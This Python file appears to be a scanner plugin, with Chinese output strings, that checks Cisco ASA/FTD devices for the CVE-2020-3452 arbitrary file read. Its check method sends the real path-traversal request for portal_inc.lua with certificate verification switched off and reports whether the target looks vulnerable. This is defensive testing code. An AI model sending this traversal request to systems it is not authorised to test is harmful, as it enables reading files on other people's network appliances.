import requests
import urllib3

class CiscoCVE20203452:
    name = "Cisco ASA/FTD CVE-2020-3452 任意文件读取漏洞"

    def check(self, target):
        vnln_url = target.rstrip("/") + "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../"
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36"
        }
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        try:
            response = requests.get(url=vnln_url, headers=headers, verify=False, timeout=20)
            if "Bad Request" in response.text:
                return f"[{self.name}] 检测目标 {target}：漏洞已修复"
            else:
                return f"[{self.name}] 检测目标 {target}：存在漏洞"
        except Exception as e:
            return f"[{self.name}] 检测目标 {target}：请求异常，{e}"

# 可直接被自动加载
